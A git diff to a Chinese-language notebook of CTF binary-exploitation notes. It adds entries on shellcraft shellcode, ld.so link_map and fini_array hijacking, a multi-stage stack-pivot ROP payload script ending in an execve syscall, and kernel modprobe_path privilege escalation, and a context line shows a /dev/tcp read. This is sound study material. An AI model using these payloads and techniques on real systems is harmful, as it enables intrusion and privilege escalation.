@@ -1334,6 +1334,8 @@ ret
   ```
   这个`cmd[rip]`和`cmd+8[rip]`不懂什么意思，调试后发现执行时分别变成了`mov rbx, qword ptr [rip + 0x19]`和`mov rbx, qword ptr [rip + 0x17]`。似乎是一种根据rip来引用字符串的固定做法？
   - [预期解](https://gist.github.com/C0nstellati0n/c5657f0c8e6d2ef75c342369ee27a6b5#babysbx)使用mremap
+- [message](https://chovid99.github.io/posts/tcp1p-ctf-2023/#message)
+  - 利用pwntools shellcraft生成open+getdents64+write shellcode获取当前目录下全部文件的文件名
 115. [minimal](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Pwn/minimal),[minimaler](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Pwn/minimaler)
 - 极小elf rop题目。源码只有简单的：
 ```c
@@ -1455,3 +1457,61 @@ cat</dev/tcp/a/1
 - 在linux里，从/dev/null读内容永远会返回end-of-file (EOF)，无论所读内容的长度。比如说用fread尝试读/dev/null的0x500的字节，fread会返回0，即没有读到任何内容
 - open device时，会在堆上分配chunk给FILE结构体用来代表该device，后续对该device的读写与其息息相关。`_IO_write_ptr`到`_IO_buf_end`是所读内容的缓冲区，若所读内容长度大于等于缓冲区的长度，会被立即丢弃；反之会将读到的内容读入`_IO_write_ptr`所记录的缓冲区（这个字段攻击者可改，改成stdout后就能修改stdout从而获取FSOP了，其他地方也同理）。从哪里读字节由当前device的FILE结构体的`_fileno`决定，且可被攻击者利用溢出等方式修改。比如原本是3，从文件描述符为3的文件里读字节，改成0后就变成从stdin读了。溢出修改`_fileno`时记得保留`_chain`字段的值
 - libc 2.38 FSOP。参考 https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc#3---the-fsop-way-targetting-stdout ，作者提供了利用的模板
+137. [fortune](https://github.com/nobodyisnobody/write-ups/tree/main/Blackhat.MEA.CTF.Finals.2023/pwn/fortune)
+- 利用ld.so link_map structure劫持程序控制流(82条的另一种利用方式)。参考 https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc/#2---targetting-ldso-link_map-structure 。`_dl_call_fini`里有一段：
+```c
+ElfW(Addr) *array = (ElfW(Addr) *) (map->l_addr + fini_array->d_un.d_ptr);
+size_t sz = (map->l_info[DT_FINI_ARRAYSZ]->d_un.d_val / sizeof (ElfW(Addr)));
+while (sz-- > 0)
+  ((fini_t) array[sz]) ();
+```
+`map->l_addr`通常为程序的基地址，`fini_array->d_un.d_ptr`也是一个固定的偏移（0x3d88）。所以如果修改`map->l_addr`为`map->l_addr+[one_gadget]-0x3d88`（[one_gadget]为存有one_gadget地址的指针），就能让程序执行one_gadget。这题利用格式化字符串直接在栈上找到`map->l_addr`并修改。找法很简单，gdb跟进到printf函数内部，然后vmmap找到程序基地址，使用`search --hex addr`(注意这里的addr为程序基地址的小端形式，要倒过来写)就能找到几个存有基地址的指针。其中一个指针会在栈上（134条破案了，它们就是记录程序基地址的玩意）
+- pwndbg调试PIE程序。今天终于找到解决办法了，利用pwndbg自带的brva即可
+```py
+context.terminal = ["tmux", "splitw", "-h"]
+p = gdb.debug("./pwn",gdbscript='''
+    si
+    brva offset_of_instruction
+    brva offset_of_instruction
+    c
+''')
+```
+138. [Digital Circuit](https://chovid99.github.io/posts/tcp1p-ctf-2023/#digital-circuit)
+- 个人觉得非常巧妙的栈迁移题，思路也值得学习。把栈迁移到bss段算常规操作，但是可输入的字节仍然不够构造完整的rop怎么办？wp利用这段代码：
+```
+        00401d23 48 8d 45 d0     LEA        RAX=>local_38,[RBP + -0x30]
+        00401d27 ba 40 00        MOV        EDX,0x40
+                 00 00
+        00401d2c 48 89 c6        MOV        RSI,RAX
+        00401d2f bf 00 00        MOV        EDI,0x0
+                 00 00
+        00401d34 e8 87 5e        CALL       read
+                 05 00
+```
+中的`LEA RAX=>local_38,[RBP + -0x30]`多次读取payload至bss段，每次稍微往上挪一点，写完完整ropchain调用即可：
+```py
+payload = p64(pop_rdi) + p64(exe.sym.anu) + p64(pop_rsi) + p64(0) + p64(pop_r13_r14_r15)
+payload += p64(canary)
+payload += p64(new_rbp+0x40) #调整rbp
+payload += p64(exe.sym.cool_thing2+182) # cool_thing2+182（LEA RAX=>local_38,[RBP + -0x30]）
+r.sendafter(b'name?\n', payload) #目前栈迁移至new_rbp,所以这段payload读到了new_rbp-0x30
+payload = p64(pop_rax) + p64(0x3b) + p64(pop_rax) + p64(0x3b) + p64(pop_r13_r14_r15) #用于跳过栈上的canary，rbp和返回地址
+payload += p64(canary)
+payload += p64(new_rbp+0x40*2)
+payload += p64(exe.sym.cool_thing2+182) # cool_thing2+182
+r.send(payload) #这段payload读到了new_rbp+0x40-0x30，就是上一段payload调整到的rbp
+payload = p64(pop_rdx_rbx) + p64(0) + p64(0) + p64(syscall_ret) + b'c'*8
+payload += p64(canary)
+payload += p64(new_rbp-0x40) #准备执行ropchain
+payload += p64(exe.sym.cool_thing2+182) # cool_thing2+182
+r.send(payload) #同理这段在new_rbp+0x40*2-0x30
+payload = b'd'*0x28
+payload += p64(canary)
+payload += p64(0) #这个rbp已经不重要了
+payload += p64(pop_rdi+1) #ret
+r.send(payload) #new_rbp-0x40-0x30
+#函数自带一个leave;ret，此时rsp为new_rbp-0x40+8.new_rbp-0x40是因为leave上半段的mov esp ebp，+8是因为leave下半段的pop ebp
+#new_rbp-0x40+8正好是第一个payload的p64(pop_rdi)
+```
+139. [💀](https://chovid99.github.io/posts/tcp1p-ctf-2023/#heading)
+- linux kernel pwn爆破kernel base+利用modprobe_path提权。利用任意地址读扫描`0xffffffff81000000`到`0xffffffffc0000000`，每次增加0x100000。当读取的内容里包含`/sbin/m`(即modprobe_path的开头)时，说明当前所在地址就是kernel base
